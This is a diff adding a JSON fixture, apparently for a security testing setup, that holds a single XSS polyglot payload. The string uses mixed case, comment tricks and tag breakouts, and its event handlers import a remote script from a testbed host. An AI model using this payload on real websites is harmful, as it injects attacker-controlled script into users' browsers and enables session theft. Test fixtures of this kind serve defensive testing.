@@ -1,0 +1,8 @@
+{
+	"data": [
+		{
+			"id": 0,
+            "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=import('http://testbed:8080/xss.js') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=import('http://testbed:8080/xss.js')//>\\x3e"
+		}
+	]
+}
